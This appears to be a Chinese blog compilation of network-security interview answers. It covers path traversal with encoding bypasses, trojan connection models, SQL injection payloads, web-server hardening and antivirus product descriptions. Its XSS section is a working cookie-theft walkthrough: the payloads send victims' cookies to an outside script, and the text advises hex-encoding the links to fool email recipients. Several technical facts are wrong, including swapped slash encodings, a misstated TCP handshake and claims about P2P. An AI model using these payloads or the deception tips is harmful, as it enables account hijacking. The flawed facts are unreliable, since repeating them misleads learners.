+<p>如果应用程序使用用户可控制的数据，以危险的方式访问位于应用服务器或其它后端文件系统的文件或目录，就会出现路径遍历<br>String rurl = request.getParameter(“rurl”);<br>BufferedWriter utput2 = new BufferedWriter(new FileWriter(new File(“/home/chenyz/”+rurl)));<br>攻击者可以将路径遍历序列放入文件名内，向上回溯，从而访问服务器上的任何文件，路径遍历序列叫“点-点-斜线”（..\）<br>http://***/go.action?file=....\etc\passwd</p>
+<p>避开过滤<br>第一种是过滤文件名参数中是否存在任何路径遍历序列(..)<br>如果程序尝试删除(..)来净化用户输入，可以用<br>….// ….\/ …./\ ….\<br>进行URL编码<br>点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c<br>进行16为Unicode编码<br>点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216<br>进行双倍URL编码<br>点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c<br>进行超长UTF-8 Unicode编码<br>点–&gt;%c0%2e %e0$40%ae %c0ae<br>反斜杠–&gt;%c0af %e0%80af %c0%af<br>正斜杠–&gt;%c0%5c %c0%80%5c<br>预防路径遍历的方法：<br>1.对用户提交的文件名进行相关解码与规范化<br>2.程序使用一个硬编码，被允许访问的文件类型列表<br>3.使用getCanonicalPath方法检查访问的文件是否位于应用程序指定的起始位置</p>
+<h3 id="介绍一下常见的木马种类"><a href="#介绍一下常见的木马种类" class="headerlink" title="介绍一下常见的木马种类?"></a>介绍一下常见的木马种类?</h3><p>目前常见的木马有三种：正向连接木马、反弹连接木马、收信木马。<br>正向连接木马，所谓正向，就是在中马者在机器上开个端口，而我们去连接他的端口。而我们要知道他的IP，才能够连接他。123就是他机器上开的端口。</p>
+<p>由于到现在，宽带上网(动态IP)和路由器的普遍，这个软件就有很大的不足。<br>动态IP：每次拨号，IP都会跟换.所以，就算对方中了木马，在下次拨号的时候，我们会因为找不到IP而丢肉鸡。</p>
+<p>（开端口-连端口，不足：需要知道肉鸡ip而且该ip若变化则难以利用）</p>
+<p>路由器：就是多个电脑同用1条宽带(网吧上网就是最好的例子)他们通过路由器连接到宽带，例如：主机的IP为225.124.3.41，而内网(就是用路由器的机器)的IP为192.168.X.X。在内网环境下，我们外界是无法访问的，就是机器中了木马也没用。下面大家看下我的示意图。简单来说，内网的机器是比较安全的，外界是无法访问的，就是我们连接不了内网器。而连接内网的机器，除非在同区域网里(在网吧A机，就能用RIDMIN连接网吧的B 机).</p>
+<p>简单总结：在不同区域网下，正向木马只能连接到外网的机器，而不能连接到内网的机器。<br>由于一系列的不足，就产生了反弹连接木马，例如出门的国产软件：灰鸽子</p>
+<p>反弹连接木马，就是在我们机器上开启一个端口，让中马者来连接我们，从而获得肉鸡的信息，就算对方的IP怎么改变，也是无际于事。如果我们自己机器上的IP改变了，肉鸡就无法找到我们的机器，从而无法获得肉鸡的信息，不过这点是不成问题的，WWW兴起，就有了域名。在网络中通过的对域名的访问能找到自己对应的IP地址，例如<a href="http://www.baidu.com的IP地址为22.181.38.4" target="_blank" rel="noopener">www.baidu.com的IP地址为22.181.38.4</a> 如果百度的IP变成12.11.22.3的话，只要域名不改变，就算IP地址怎么变，它也能找到你。就算是内网的机器，我们也能获得他的信息。</p>
+<p>总结到底：本地开启1个端口，肉鸡连接上我们，就算是内外网的机器也可以。</p>
+<p>反弹连接木马最头疼的地方就是使用者是内网状态的(大家可以看我的路线图，蓝色为反弹连接，黑色为正常连接)。说到为什么最头疼，大家就回忆下正向连接木马的原理。别人是无法直接访问路由器内的机器(内网)。</p>
+<h1 id="关于某知名网络安全公司的面试笔试"><a href="#关于某知名网络安全公司的面试笔试" class="headerlink" title="关于某知名网络安全公司的面试笔试"></a>关于某知名网络安全公司的面试笔试</h1><p>虽然考题大部分是一些基础词题，但是明显可以看得出来，如果没有深厚的功底，是答不好的。我报网络安全工程师。</p>
+<h3 id="1-描述tcp的三次插手，写出syn-ack的关系"><a href="#1-描述tcp的三次插手，写出syn-ack的关系" class="headerlink" title="1.描述tcp的三次插手，写出syn ack的关系"></a>1.描述tcp的三次插手，写出syn ack的关系</h3><p>我答：第一次握手：建立连接时，客户端发送syn包（syn=j）到服务器，并进入syn_send状态，等待服务器确认：<br>第二次握手：服务器接收到客户端发来的syn包。必须确认客户的syn（ack=j+1）,同时自己也发送一个syn包（syn=k），也就是syn+ack包，此时服务器进入syn_recv状态：<br>第三次握手：客户端就收到服务器的syn+ack包，向服务器发送ack包（ack=k+1），此时数据波发送完毕。客户端和服务器进入established状态，完成三次握手。<br>SYN是发送标志位,ACK是确认标志位  ps FIN是结束标志位</p>
+<p>客户端 –syn—》 服务器端</p>
+<p>客户端《–syn+ack–服务器端</p>
+<p>客户端 –syn+ack—》 服务器端</p>
+<h3 id="2：描述tcp-udp的区别及优劣。描述p2p机制，及其发展前景"><a href="#2：描述tcp-udp的区别及优劣。描述p2p机制，及其发展前景" class="headerlink" title="2：描述tcp/udp的区别及优劣。描述p2p机制，及其发展前景"></a>2：描述tcp/udp的区别及优劣。描述p2p机制，及其发展前景</h3><p>我答：区别：</p>
+<p>TCP—传输控制协议,提供的是面向连接、可靠的字节流服务。当客户和服务器彼此交换数据前，必须先在双方之间建立一个TCP连接，之后才能传输数据。</p>
+<p>TCP提供超时重发，丢弃重复数据，检验数据，流量控制等功能，保证数据能从一端传到另一端。（TCP 建立连接 完整性强 速度慢）<br>UDP—用户数据报协议，是一个简单的面向数据报的运输层协议。UDP不提供可靠性，它只是把应用程序传给IP层的数据报发送出去，但是并不能保证它们能到达目的地。</p>
+<p>由于UDP在传输数据报前不用在客户和服务器之间建立一个连接，且没有超时重发等机制，故而传输速度很快   （UDP 不建立连接 不可靠 速度快）<br>优劣：当数据传输的性能必须让位于数据传输的完整性、可控制性和可靠性时，TCP协议是当然的选择。当强调传输性能而不是传输的完整性时，如：音频和多媒体应用，UDP是最好的选择。在数据传输时间很短，以至于此前的连接过程成为整个流量主体的情况下，UDP也是一个好的选择，如：DNS交换。</p>
+<p>p2p机制描述：P2P是英文Peer-to-Peer（对等）的简称，又被称为“点对点”。“对等”技术，是一种网络新技术，依赖网络中参与者的计算能力和带宽，而不是把依赖都聚集在较少的几台服务器上。P2P还是英文Point to Point （点对点）的简称。它是下载术语，意思是在你自己下载的同时，自己的电脑还要继续做主机上传，这种下载方式，人越多速度越快但缺点是对硬盘损伤比较大（在写的同时还要读），还有对内存占用较多，影响整机速度。<br>发展前景：P2P技术擅长的地方就是最大限度地利用闲置的网络资源，这种应用在高能物理、核物理、气象、水文、太空研究等海量计算领域有巨大的应用前景。由于P2P技术是基于IPV6协议的，而IPV6的地址分配量是一个惊人的天文数字，在P2P技术支持下，在不远的将来，你可以用你的手机控制自家点灯的开关。产品推出后经常需要打补丁以解决发现的BUG或安全隐患，P2P技术使产品的分发变得十分简单，所有拥有这种产品的人会自动形成一个Workgroup，并且有严格的身份认证。产品厂商随时在这里提供升级补丁服务，而P2P技术会使你的电脑在不知不觉中完成打补丁和各种升级服务。对无线业务稍有了解的人都应该知道，我们的MMS还都是需要运营商Server的转发才能实现的。你有没有想过当你遇到一个令你激动的情景，只需要用手机的摄像头对准它，就可以将这个情景以Video的形式直接传送到你的朋友们那里，而这些看似只有在科幻电影中才有的镜头，在P2P技术中是完全可以方便地实现的。</p>
+<h3 id="3排序，用冒泡法或快速排序法，并分析时间-空间复杂度"><a href="#3排序，用冒泡法或快速排序法，并分析时间-空间复杂度" class="headerlink" title="3排序，用冒泡法或快速排序法，并分析时间/空间复杂度"></a>3排序，用冒泡法或快速排序法，并分析时间/空间复杂度</h3><h3 id="IBatis如何防范SQL-注入攻击"><a href="#IBatis如何防范SQL-注入攻击" class="headerlink" title="IBatis如何防范SQL 注入攻击?"></a>IBatis如何防范SQL 注入攻击?</h3><p>风险：数据库资料被窃取，服务器被攻击者控制<br>漏洞1 示例：<br>在sqlmap中如下写法：<br>select <em> from table where name like ‘%$value$%’<br>UnSafeBean b = (UnSafeBean)sqlMap.queryForObject(“value”, request.getParameter(“name”));<br>漏洞1 说明：<br>其中sqlmap方式是把$</em>$ 替换，假设用户输入 ‘;drop table admin–<br>那么翻译为本地SQL为<br>select <em> from table where name like ‘%’;drop table admin–%’<br>修补方法：<br>采用 #</em># 的方式 sqlmap是采用 预编译方式处理<br>把转义操作交给数据库本身！<br>select * from table where name like ‘%’||#value#||’%’</p>
+<p>漏洞2 示例：</p>
+<p><select id="queryByDynamicCondition" resultmap="PrivateShowroomProductResult"><br>$OrderId$ $sortSeq$<br>String orderId = group.getField(“orderId”).getStringValue();<br>query.setOrderId(StringUtils.isNotBlank(orderId)?orderId:null);<br>PaginationQueryList pageList =<br>orderService.listCustomerOrderForMistinessQuery(query);<br>漏洞2 说明：<br>其中sqlmap方式是把$<em>$ 替换，假设用户输入 a;drop table admin–<br>那么翻译为本地SQL为<br>select </em> from PRIVATE_SHOWROOM_PRODUCT order by a;drop table admin–<br>修补方法：</select></p>
+<p><select id="queryByDynamicCondition" resultmap="PrivateShowroomProductResult"><br>$OrderId:METADATA$ $sortSeq:SQLKEYWORD$</select></p>
+<h3 id="如何保障Web服务器安全"><a href="#如何保障Web服务器安全" class="headerlink" title="如何保障Web服务器安全?"></a>如何保障Web服务器安全?</h3><p>维护Web服务器安全是信息安全中最不讨好的差事之一。你需要在相冲突的角色中找到平衡，允许对网络资源的合法访问，同时阻止恶意破坏。</p>
+<p>你甚至会考虑双重认证，例如RSA SecurID，来确保认证系统的高信任度，但是这对所有网站用户来说也许不实用，或者不划算。尽管存在这样相冲突的目标，仍有六个有助Web服务器安全的步骤。</p>
+<p>1 、对内部和外部应用分别使用单独的服务器<br>假设组织有两类独立的网络应用，面向外部用户的服务和面向内部用户的服务，要谨慎地将这些应用部署在不同的服务器上。这样做可以减少恶意用户突破外部服务器来获得对敏感的内部信息地访问。如果你没有可用的部署工具，你至少应该考虑使用技术控制（例如处理隔离），使内部和外部应用不会互相牵涉。<br>2 、使用单独的开发服务器测试和调试应用软件<br>在单独的Web服务器上测试应用软件听起来像是常识——的确是。不幸的是，许多组织没有遵循这个基本规则，相反允许开发者在生产服务器上调试代码甚至开发新软件。这对安全和可靠性来说都很可怕。在生产服务器上测试代码会使用户遇到故障，当开发者提交未经测试易受攻击的代码时，引入安全漏洞。大多数现代版本控制系统（例如微软的Visual SourceSafe）有助于编码/测试/调试过程自动化。<br>3 、审查网站活动，安全存储日志<br>每一个安全专业人员都知道维护服务器活动日志的重要性。由于大多数Web服务器是公开的，对所有互联网服务进行审核是很重要的。审核有助你检测和打击攻击，并且使你可以检修服务器性能故障。在高级安全环境中，确保你的日志存储在物理安全的地点——最安全的（但是最不方便的）技巧是日志一产生就打印出来，建立不能被入侵者修改的纸记录，前提是入侵者没有物理访问权限。你也许想要使用电子备份，例如登录进安全主机，用数字签名进行加密，来阻止日志被窃取和修改。<br>4 、 培训开发者进行可靠的安全编码<br>软件开发者致力于创建满足商业需求的应用软件，却常常忽略了信息安全也是重要的商业需求。作为安全专业人员，你有责任对开发者进行影响到Web服务器的安全问题的培训。你应该让开发者了解网络中的安全机制，确保他们开发的软件不会违背这些机制；还要进行概念的培训，例如内存泄漏攻击和处理隔离——这些对编码和生成安全的应用软件大有帮助。<br>5 、给操作系统和Web服务器打补丁<br>这是另一个常识，但是当管理员因为其他任务而不堪重荷时常常忽略这一点。安全公告，像是CERT或者微软发布的公告，提醒人们软件厂商多频繁地发布某些安全漏洞的修补程序。一些工具像是微软的软件升级服务（SUS）和RedHat的升级服务有助于使这项任务自动化。总之，一旦漏洞公布，如果你不修补它，迟早会被人发现并利用。<br>6 、使用应用软件扫描<br>如果负担地起，你也许会考虑使用应用软件扫描器来验证内部编码。像是 Watchfire公司的AppScan这样的工具有助于确保编码在生产环境里不会存在漏洞。记住，要有安全意识。设计良好的 Web服务器结构应该基于健全的安全政策。贯彻执行这六个方法会帮助你建立坚固的基础。</p>
+<h1 id="网络安全类面试题"><a href="#网络安全类面试题" class="headerlink" title="网络安全类面试题"></a>网络安全类面试题</h1><h3 id="怎么样提高局域网安全"><a href="#怎么样提高局域网安全" class="headerlink" title="怎么样提高局域网安全"></a>怎么样提高局域网安全</h3><p>2、公司网络安全具体指什么?(NTT公司)(一是网络方面,另一个是公司的制度)<br>3、如果用户电脑中毒了，但用户不想重新安装系统，通过什么方法最有效的解决问题?<br>4、你接触过哪些杀毒软件，杀毒软件客户端可以通过那些方法安装?<br>5、mcafee是什么软件?你熟悉吗?<br>6、安全是什么<br>7、针对135端口的攻击的检测?<br>8、无端口木马与反射端口木马有什么不同?</p>
+<h3 id="如何判断计算机可能已经中马"><a href="#如何判断计算机可能已经中马" class="headerlink" title="如何判断计算机可能已经中马?"></a>如何判断计算机可能已经中马?</h3><p>计算机系统运行速度减慢。<br>计算机系统经常无故发生死机。<br>计算机系统中的文件长度发生变化。<br>计算机存储的容量异常减少。<br>系统引导速度减慢。<br>丢失文件或文件损坏。<br>计算机屏幕上出现异常显示。<br>计算机系统的蜂鸣器出现异常声响。<br>磁盘卷标发生变化。<br>系统不识别硬盘。<br>对存储系统异常访问。<br>键盘输入异常。<br>文件的日期、时间、属性等发生变化<br>文件无法正确读取、复制或打开。<br>命令执行出现错误。<br>虚假报警。<br>换当前盘。有些病毒会将当前盘切换到C盘。<br>时钟倒转。有些病毒会命名系统时间倒转，逆向计时。<br>Windows操作系统无故频繁出现错误。<br>系统异常重新启动。<br>一些外部设备工作异常。<br>异常要求用户输入密码。<br>Word或Excel提示执行“宏”。<br>是不应驻留内存的程序驻留内存。</p>
+<h3 id="什么叫做SQL注入，如何防止-请举例说明。"><a href="#什么叫做SQL注入，如何防止-请举例说明。" class="headerlink" title="什么叫做SQL注入，如何防止?请举例说明。"></a>什么叫做SQL注入，如何防止?请举例说明。</h3><p>利用sql关键字对网站进行攻击。过滤关键字’等<br>所谓SQL注入（SQL Injection），就是利用程序员对用户输入数据的合法性检测不严或不检测的特点，故意从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取想得到的资料。<br><a href="http://localhost/lawjia/show.asp?ID=444" target="_blank" rel="noopener">http://localhost/lawjia/show.asp?ID=444</a> and user&gt;0，这时，服务器运行Select * from 表名 where 字段=444 and user&gt;0这样的查询，当然，这个语句是运行不下去的，肯定出错，错误信息如下：<br>·错误类型：<br>Microsoft OLE DB Provider for ODBC Drivers (0x80040E07)<br>[Microsoft][ODBC SQL Server Driver][SQL Server]将 nvarchar 值 ‘sonybb’ 转换为数据类型为 int 的列时发生语法错误。</p>
+<h3 id="能否解释一下XSS-cookie盗窃是什么意思"><a href="#能否解释一下XSS-cookie盗窃是什么意思" class="headerlink" title="能否解释一下XSS cookie盗窃是什么意思?"></a>能否解释一下XSS cookie盗窃是什么意思?</h3><p>根据作为攻击对象的Web程序，下面某些变量和插入位置可能需要进行调整。要注意这只是攻击方法的一个例子。在这个例子中，我们将利用脚本“a.php”中的 “viriable”变量中的跨站脚本漏洞，通过正常请求进行攻击。这是跨站脚本攻击最常见的形式。<br>第一步: 锁定目标<br>当你找到某个Web程序存在XSS漏洞之后，检查一下它是否设置了cookie。如果在该网站的任何地方设置了cookie，那么就可以从用户那里盗取它。<br>第二步: 测试<br>不同的攻击方式将产生不同的XSS漏洞，所以应适当进行测试以使得输出结果看起来像是正常的。某些恶意脚本插入之后会破坏输出的页面。（为欺骗用户，输出结果非常重要，因此攻击者有必要调整攻击代码使输出看起来正常。）</p>
+<p>下一步你需要在链接至包含XSS漏洞的页面的URL中插入 Javascript（或其他客户端脚本）。下面列出了一些经常用于测试XSS漏洞的链接。当用户点击这些链接时，用户的cookie奖被发送到 <a href="http://www.cgisecurity.com/cgi-bin/cookie.cgi" target="_blank" rel="noopener">www.cgisecurity.com/cgi-bin/cookie.cgi</a> 并被显示。如果你看到显示结果中包含了cookie信息，说明可能可以劫持该用户的账户。<br>盗取Cookie的Javascript示例。使用方法如下。</p>
+<p>ASCII用法<br><a href="http://host/a.php?variable=”&gt;document.location=’http://www.cgisecurity.com/cgi-bin/cookie.cgi" target="_blank" rel="noopener">http://host/a.php?variable=”&gt;document.location=’http://www.cgisecurity.com/cgi-bin/cookie.cgi</a>? ‘%20+document.cookie<br>十六进制用法<br><a href="http://host/a.php?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f" target="_blank" rel="noopener">http://host/a.php?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f</a></p>
+<p>%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67<br>%69%73%65%63%75%72%69%74%79 %2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f<br>%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63% 75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e</p>
+<p>注意: 每种用法都先写为ASCII，再写成十六进制以便复制粘贴。</p>
+<ol>
+<li>“&gt;document.location=’<a href="http://www.cgisecurity.com/cgi-bin/cookie.cgi?’" target="_blank" rel="noopener">http://www.cgisecurity.com/cgi-bin/cookie.cgi?’</a> +document.cookie</li>
+</ol>
+<p>HEX %22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e<br>%6c%6f%63%61%74%69%6f%6e%3d%27 %68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65<br>%63%75%72%69%74%79%2e%63%6f%6d%2f%63%67%69 %2d%62%69%6e%2f<br>%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f %6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e</p>
+<ol start="2">
+<li>document.location=’<a href="http://www.cgisecurity.com/cgi-bin/cookie.cgi?’" target="_blank" rel="noopener">http://www.cgisecurity.com/cgi-bin/cookie.cgi?’</a> +document.cookie</li>
+</ol>
+<p>HEX %3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f<br>%63%61%74%69%6f%6e%3d%27%68%74%74 %70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72<br>%69%74%79%2e%63%6f%6d%2f%63%67%69%2d%62%69%6e %2f%63%6f%6f%6b<br>%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c %2f%73%63%72%69%70%74%3e</p>
+<ol start="3">
+<li><blockquote>
+<p>document.location=’<a href="http://www.cgisecurity.com/cgi-bin/cookie.cgi?’" target="_blank" rel="noopener">http://www.cgisecurity.com/cgi-bin/cookie.cgi?’</a> +document.cookie</p>
+</blockquote>
+</li>
+</ol>
+<p>HEX %3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c<br>%6f%63%61%74%69%6f%6e%3d%27%68%74 %74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75<br>%72%69%74%79%2e%63%6f%6d%2f%63%67%69%2d%62%69 %6e%2f%63%6f%6f<br>%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65 %3c%2f%73%63%72%69%70%74%3e</p>
+<p>第三步: 执行XSS<br>将做好的URL通过电子邮件或其他方式发送出去。注意如果你直接将URL发送给其他人（通过电子邮件、即时通讯软件或其他方式），你应当将其进行十六进制编码，因为这些URL一眼便可看出包含恶意代码，但经过十六进制编码之后就可以欺骗大部分人。<br>第四步: 处理收集到的信息<br>一旦用户点击了你的URL，相应数据就会被发送到你的CGI脚本中。这样你就获得了 cookie信息，然后你可以利用Websleuth之类的工具来检查是否能盗取那个账户。</p>
+<p>在上面的例子中，我们仅仅将用户带到了 cookie.cgi页面上。如果你有时间，你可以在CGI中将用户重定向到原来的页面上，即可在用户不知不觉之中盗取信息。</p>
+<p>某些电子邮件程序在打开附件时会自动执行附件中的Javascript代码。即使像Hotmail这样的大型网站也是如此，不过它对附件内容作了许多过滤以避免cookie被盗。</p>
+<h3 id="木马的传播途径主要有哪些"><a href="#木马的传播途径主要有哪些" class="headerlink" title="木马的传播途径主要有哪些?"></a>木马的传播途径主要有哪些?</h3><p>木马主要是依靠邮件、下载等途径进行传播<br>木马也可以通过各种脚本进行传播。比如，IE浏览器在执行脚本时存在一些漏洞，入侵者可以利用这些漏洞进行木马的传播与种植。当目标主机执行了木马的服务端程序之后，入侵者便可以通过客户端程序与目标主机上的服务端建立连接，进而控制目标主机。对于通信协议的选择，绝大多数木马使用的是TCP/IP协议，但也有使用UDP协议的木马。所以，做好木马的检测工作可以及时的发现以及处理木马，降低木马所带来的损失。</p>
+<h3 id="SQL注入攻击的种类有哪些"><a href="#SQL注入攻击的种类有哪些" class="headerlink" title="SQL注入攻击的种类有哪些?"></a>SQL注入攻击的种类有哪些?</h3><p>没有正确过滤转义字符<br>SELECT <em> FROM users WHERE name = ‘” + userName + “‘;<br>SELECT </em> FROM users WHERE name = ‘a’ OR ‘t’=’t’;<br>2.错误的类型处理<br>SELECT <em> FROM data WHERE id = ” + a_variable + “;<br>SELECT </em> FROM DATA WHERE id = 1; DROP TABLE users;<br>3.数据库服务器中的漏洞<br>MYSQL服务器中mysql_real_escape_string()函数漏洞，允许一个攻击者根据错误的统一字符编码执行成功的SQL注入式攻击<br>4.盲目SQL注入式攻击<br>Absinthe的工具就可以使这种攻击自动化<br>5.条件响应<br>6.条件性差错<br>7.时间延误</p>
+<h3 id="请介绍一下常见的网络安全防护软件的性能"><a href="#请介绍一下常见的网络安全防护软件的性能" class="headerlink" title="请介绍一下常见的网络安全防护软件的性能"></a>请介绍一下常见的网络安全防护软件的性能</h3><p>金山毒霸2005<br> 1、特别推荐<br>主动实时升级：<br>无需用户做任何操作，当有最新的病毒库或者功能出现时，金山毒霸可将此更新自动下载安装。此功能保证您在任何时刻都可以获得与全球同步的最新病毒特征库，防止被新病毒破坏感染，即使面对“冲击波”这样快速传播的病毒，金山毒霸2005也能极大程度的遏制病毒入侵用户计算机！</p>
+<p>抢先启动防毒系统：<br>防毒胜于杀毒，抢先启动的防毒系统可保障在Windows未完全启动时就开始保护用户的计算机系统，早于一切开机自运行的病毒程序，使用户避免“带毒杀毒”的危险。抢先式防毒让您的安全更早一步。</p>
+<p>2、经典奉献<br>主动漏洞修复：<br>可扫描操作系统及各种应用软件的漏洞，当新的安全漏洞出现时，金山毒霸会下载漏洞信息和补丁，经扫描程序检查后自动帮助用户修补。此功能可确保用户的操作系统随时保持最安全状态，避免利用该漏洞的病毒侵入系统。另外还会扫描系统中存在的诸如简单密码、完全共享文件夹等安全隐患。</p>
+<p>跟踪式反间谍：<br>采用全新的网络程序校验策略。除了传统反黑、拦截木马等功能外，同时对普通应用程序进行跟踪监控。一旦应用程序的大小、内容等属性发生异常变化，系统将特别提醒用户注意，有效防止止木马、间谍软件“冒名顶替”盗取用户数据。</p>
+<p>木马防火墙：<br>通过多种技术，实现对木马进程的查杀。系统中一旦有木马、黑客或间谍程序访问网络，会及时拦截该程序对外的通信访问，然后对内存中的进程进行自动查杀，保护用户网络通信的安全。这对防御盗取用户信息的木马、黑客程序特别有效。<br>星杀毒软件网络版是一款应用于复杂网络结构的企业级反病毒产品，该产品专门为企业用户量身定做，使企业轻松构建安全的立体防毒体系。该产品主要适用于企业服务器与客户端，支持 WindowsNT/2000/XP、Unix、Linux等多种操作平台，全面满足企业整体反病毒需要。</p>
+<p>瑞星杀毒软件网络版创立并实现了“分布处理、集中控制”技术，以系统中心、服务器、客户端、控制台为核心结构，成功地实现了远程自动安装、远程集中控管、远程病毒报警、远程卸载、远程配置、智能升级、全网查杀、日志管理、病毒溯源等功能，它将网络中的所有计算机有机地联系在一起，构筑成协调一致的立体防毒体系。</p>
+<p>瑞星杀毒软件网络版采用目前国际上最先进的结构化多层可扩展（SME）技术设计研制的第五代引擎，实现了从预杀式无毒安装、漏洞扫描、特征码判断查杀已知病毒，到利用瑞星专利技术行为判断查杀未知病毒，并通过可疑文件上报系统、嵌入式即时安全信息中心与瑞星中央病毒判别中心构成的信息交互平台，改被动查杀为主动防御，为网络中的个体计算机提供点到点的立体防护<br>江民杀毒KV2005 9.00.504(2005.1.13)</p>
+<p>软件语言：简体中文<br>授权方式：零售版<br>软件类别：病毒防治<br>运行环境：Win9x/WinNT/2000/ME/XP<br>采用先进的“驱动级编程技术”，能够与操作系统底层技术更紧密结合，具有更好的兼容性，占用系统资源更小。 KV2005突出特点是独创的“系统级深度防护技术”与操作系统互动防毒，彻底改变以往杀毒软件独立于操作系统和防火墙的单一应用模式，开创杀毒软件系统级病毒防护新纪元。据悉，江民对微软的XP SP2安全中心进行了延伸和拓展，在此基础上开发了KV安全中心，不但可以在XP操作系统上应用，WIN98、WIN2000用户同样可以拥有安全中心。同时，KV2005采用了先进的“立体联动防杀技术”，即杀毒软件与防火墙联动防毒、同步升级，对于防范集蠕虫、木马、后门程序等特性于一体的混合型病毒更有效<br>卡巴斯基(Kaspersky Internet Security) 2006 6.0.9.96 汉化版</p>
+<p>软件大小：9005K<br>软件语言：简体中文<br>授权方式：免费版<br>软件类别：病毒防治<br>运行环境：Win9x/WinNT/2000/ME/XP<br>软件介绍：</p>
+<p>Kaspersky 为任何形式的个体和社团提供了一个广泛的抗病毒解决方案。它提供了所有类型的抗病毒防护：抗病毒扫描仪，监控器，行为阻段和完全检验。它支持几乎是所有的普通操作系统、e-mail 通路和防火墙。Kaspersky控制所有可能的病毒进入端口，它强大的功能和局部灵活性以及网络管理工具为自动信息搜索、中央安装和病毒防护控制提供最大的便利和最少的时间来建构你的抗病毒分离墙。<br>这是最新的 Kaspersky 安全套装，包括了反病毒、反黑客、反间谍、反垃圾邮件、前摄防御等全套安全工具，可让你的系统高枕无忧。此版是第一个原型测试版，某些功能尚在开发中，估计 BUG较多，请谨慎使用。<br>汉化注意事项：<br>1、请先安装原英文软件。<br>2、建议汉化前退出 KAV 应用程序，包括系统栏图标！<br>3、运行汉化包中的汉化补丁，按正确的安装目录进行汉化（汉化会自动查找安装目录）。必要时请重启动电脑。<br>4、再次启动 Kaspersky 即是中文界面。<br>5、此次汉化是另加的中文语言包，并保留原英文和俄文的语言。<br>6、在反黑客的设置中，因原程序原因，规则配置一栏不能汉化，否则在规则描述中原来可修改的值的顺序会被打乱。只有等下一版官方解决了这个问题才行。</p>
+<p>Norton2005 安全特警简体中文正式版（含防火墙）</p>
+<p>软件语言： 简体中文<br>软件类型： 国外软件 / 免费版<br>运行环境： Win9X/Me/WinNT/2000/XP<br>授权方式： 正式版<br>软件大小： 174.25MB</p>
+<p>有力防护病毒、蠕虫和特洛伊木马程序<br>诺顿防病毒软件2005包含新的互联网蠕虫防护，保护个人和家庭工作室用户不受迅速传播的新型混合互联网蠕虫的攻击，即使这些病毒可以通过多个入口攻击计算机用户的系统。将蠕虫阻止技术应用到下一层，互联网蠕虫防护可以阻止联网端口以防止诸?quot;震荡波”，”MyDoom”和”冲击波”威胁的传播，而这些病<br>毒通常通过传统的防病毒解决方案防护不到的系统漏洞，进行自身传播。</p>
+<p>诺顿防病毒软件2005将继续提供可靠的自动服务，无需用户干预，就可以扫描和清除病毒、蠕虫和特洛伊木马程序。诺顿防病毒软件2005还包含间谍软件检测功能，抵御用户计算机上那些被用来恶意泄漏系统安全、监视用户隐私数据或跟踪用户联机行为的程序。</p>
+<p>对黑客和隐私窃贼的必要防护<br>诺顿个人防火墙2005采用了新的机密信息阻止工具，提供增强的隐私控制，因此可以直接保护用户隐私免遭侵害，甚或是最微小的干扰。新特性支持用户不中断地发送机密信息到他们信任的网站；当用户发送个人数据到不可信任的网站时，则发出警告。机密信息阻止技术有助于防止用户成为网页仿冒的牺牲品。网页仿冒是一种欺诈，它引诱互联网用户向有害并具有潜在威胁的网站提供机密的个人信息，从而导致用户身份被窃。</p>
+<p>赛门铁克强健的入侵防护技术是诺顿个人防火墙2005的另一个关键配置。它提供重要的附加安全层，可以结合软件的防火墙，从而预先识别潜在的攻击。这一附加防护层支持诺顿个人防火墙2005仔细监测实际互联网流量，以便有效地识别和阻止联网攻击的尝试。这些，是一个基本的没有入侵防护的防火墙所无法做到的。</p>
+<p>全面的电子邮件过滤解决方案<br>由于垃圾邮件持续激增，并日益成为一种安全威胁，赛门铁克最新的增强型诺顿反垃圾邮件2005将提供更强的过滤能力来解决电子邮件用户最常见的担心。诺顿反垃圾邮件2005将对某些形式的电子邮件欺诈提供更多的保护，它识别在电子邮件消息内的欺诈的URL互联网地址，并过滤这些信息中的欺骗性的、虚假的发送方地址。用户还可以选择过滤色情垃圾邮件，这样，不想要的内容永远不会抵达收件箱。他们也可以使用诺顿反垃圾邮件2005中基于语言的新型过滤器来阻止特定语言的电子邮件信息。</p>
